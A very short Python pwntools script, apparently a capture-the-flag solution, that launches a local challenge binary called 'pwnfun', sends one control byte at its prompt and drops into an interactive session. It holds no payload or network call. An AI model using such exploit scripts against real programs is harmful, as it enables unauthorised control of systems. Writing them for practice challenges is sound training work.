from pwn import *
def main():
    p = process('./pwnfun')
    p.recvuntil('>')
    p.sendline('\x02')
    p.interactive()
main()